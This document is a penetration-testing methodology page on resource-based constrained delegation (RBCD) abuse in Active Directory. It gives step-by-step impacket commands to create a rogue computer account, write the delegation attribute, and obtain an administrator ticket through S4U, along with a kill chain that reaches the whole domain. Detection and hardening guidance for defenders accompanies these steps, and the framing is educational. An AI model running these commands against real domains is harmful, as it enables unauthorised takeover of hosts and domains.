> **English** | [Italiano](README.md)

# Resource-Based constrained delegation (RBCD) abuse

> - **Phase:** Privilege Escalation / Lateral Movement (Active Directory domain)
> - **Visibility:** Medium - requires writing an attribute on a computer object (AD modification) and S4U requests to the KDC
> - **Prerequisites:** write access to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target computer object (e.g., GenericWrite/GenericAll on the computer); the ability to control an account with an SPN (or to create one by abusing the MachineAccountQuota)
> - **Technique:** `RBCD abuse` | **Typical severity:** `Critical` | **Finding ID:** to assign in lab (methodology)

- Nature of the document: methodology. Illustrative outputs; placeholder identifiers.
- Objective: obtain execution as a local administrator (or as any user) on a target computer, abusing resource-based constrained delegation.

---

## Executive summary

Resource-Based Constrained Delegation (RBCD) moves the delegation decision from the sending service's side to
the target resource's side: a computer specifies, in the `msDS-AllowedToActOnBehalfOfOtherIdentity`
attribute, which accounts can impersonate other users toward it. The abuse: if the attacker can write that
attribute on the target computer (a right often revealed by BloodHound as GenericWrite/GenericAll), they
insert an account they control; then, through the Kerberos S4U extensions (S4U2self + S4U2proxy), they obtain
a service ticket for the target impersonating an administrator. The result is privileged execution on the
computer.

Often the "controlled" account to insert is created by abusing the MachineAccountQuota (by default, every
domain user can create up to 10 computer accounts), which provides a ready-to-use account with an SPN.

## Operational context (why, before how)

RBCD is one of the most common paths BloodHound flags, because write access to a computer object is frequent
(administrative delegation, management groups). The operational decision is twofold: which account to use as
the "impersonator" (one already controlled with an SPN, or a new one created via MachineAccountQuota) and
which privileged user to impersonate toward the target (typically a local or domain admin).

## Execution / commands

### Phase 1 - prepare an account with an SPN (if needed)

```bash
# Creates a computer account by abusing the MachineAccountQuota (if > 0); provides a controlled SPN
addcomputer.py corp.local/utente:'Password123' -dc-ip 10.10.10.10 \
  -computer-name 'EVIL$' -computer-pass 'EvilPass123'
```

### Phase 2 - write the delegation on the target

```bash
# Sets msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer, delegating to EVIL$
rbcd.py corp.local/utente:'Password123' -dc-ip 10.10.10.10 -action write \
  -delegate-from 'EVIL$' -delegate-to 'TARGET$'
```

### Phase 3 - impersonation via S4U

```bash
# Requests a TGS for the target's service impersonating 'administrator' (S4U2self + S4U2proxy)
getST.py corp.local/'EVIL$':'EvilPass123' -dc-ip 10.10.10.10 \
  -spn 'cifs/target.corp.local' -impersonate administrator
```

Illustrative output (representative):

```
[*] Impersonating administrator
[*] Saving ticket in administrator@cifs_target.corp.local.ccache   <-- admin access to the target
```

## Analysis of results

The result is privileged access (typically local admin) to the target computer, from which you proceed to
credential dumping and lateral movement. The severity is `Critical` when the target is a high-value system (or
when the chain, repeated, reaches a DC). RBCD is particularly insidious because it exploits a feature designed
for legitimate delegation scenarios.

### Theoretical analysis

The S4U (Service for User) extensions allow a service to obtain tickets on behalf of a user: S4U2self obtains
a ticket toward itself in the user's name, S4U2proxy "forwards" it toward another service. RBCD defines, on
the resource side, who is authorized for this forwarding. The violation (property P3, confinement of
authority) arises when the right to write the delegation attribute ends up with an untrusted principal: the
attacker self-authorizes to impersonate anyone toward the target. Kerberos cryptography works correctly; the
problem is the ACL that allows writing the attribute. See
[THEORETICAL-FOUNDATIONS](<../../THEORETICAL-FOUNDATIONS.en.md>).

## Remediation (blue team)

**Detection.** Modifications to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (Event ID 5136 on
computer objects); creation of computer accounts by standard users (MachineAccountQuota abuse); anomalous S4U
requests.

**Hardening.** Set `MachineAccountQuota` to 0 (users must not be able to create computer accounts); restrict
write rights on computer objects; monitor changes to delegation attributes; use Protected Users and mark
sensitive accounts as non-delegable.

---

## Real-World scenario: Post-Exploitation projection

> RBCD leads to host compromise and, when chained, to the domain (severity Critical).

### Attacker perspective (red team)

**Starting point:** write access to a computer object (from BloodHound) and a domain account.

**Immediate next step:** create/use an account with an SPN, write the delegation on the target, impersonate an
admin via S4U.

**Projected Kill Chain:**

```
GenericWrite on a computer (from BloodHound)
        |
        v
MachineAccountQuota -> EVIL$ account with an SPN
        |
        v
Write msDS-AllowedToActOnBehalfOfOtherIdentity -> S4U -> admin TGS toward the target
        |
        v
Local admin on the computer -> credential dumping -> lateral movement
        |
        v
Repetition toward a DC or DCSync -> full domain
```

**Potential impact:** from a single write right to administration of key hosts and, in cascade, the domain.

**Typical monetization vectors:** ransomware/exfiltration downstream of the domain; access brokering.

### Defender perspective (blue team)

**Detection:** Event ID 5136 on delegation attributes; creation of computer accounts by standard users;
unexpected S4U.

**Indicators of Compromise (IOC):** appearance of new computer accounts with an SPN created by users;
modification of `msDS-AllowedToActOnBehalfOfOtherIdentity`; impersonation tickets toward sensitive hosts.

**Containment:** remove the abused delegation attribute; disable the malicious computer account; investigate
accesses to the target.

**Eradication and hardening:** MachineAccountQuota to 0; review of write rights on computer objects;
continuous monitoring of delegation changes.

**Defensive lesson:** an apparently harmless write right on a computer object can be worth administration of
that computer. The defense is rigorous ACL review (which BloodHound makes evident) and zeroing the
MachineAccountQuota.

---

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `rbcd.py` (impacket) | ad tool | cli - active | writing/reading the rbcd delegation attribute |
| `addcomputer.py` (impacket) | ad tool | cli - active | creating a computer account via machineaccountquota |
| `getST.py` (impacket) | kerberos tool | cli - active | s4u ticket request with impersonation |
| `Rubeus` | .net kerberos tool | cli - active | s4u and rbcd from a windows host |
| `BloodHound` | graph enum | gui | identification of the write right on the computer object |

## Methodology notes

In a real lab document: the right exploited (from BloodHound), the MachineAccountQuota value, the attribute
write and the S4U impersonation outcome. Verify the MachineAccountQuota=0 countermeasure.

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| persistence | account manipulation | `T1098` | writing the rbcd delegation attribute on the target computer object. |
| lateral movement | use alternate authentication material: pass the ticket | `T1550.003` | use of the s4u ticket to access the target as an administrator. |
| credential access | steal or forge kerberos tickets | `T1558` | obtaining impersonation tickets via s4u. |

## Links to other modules

| source | this technique | effect |
| :--- | :--- | :--- |
| [bloodhound](<../../01-enumeration/bloodhound/README.en.md>) | rbcd | identifies the write right on the computer |
| rbcd | [07-post-exploitation - credential dumping](<../../../07-post-exploitation/README.en.md>) | admin access to the host enables credential dumping |
| rbcd | [dcsync](<../../05-credential-dumping/dcsync/README.en.md>) | the chain repeated toward a dc leads to abused replication |

---

> **Note:** All described techniques are for educational and methodology-documentation purposes. Execution only in owned labs or with explicit authorization. Illustrative outputs, not from real systems.
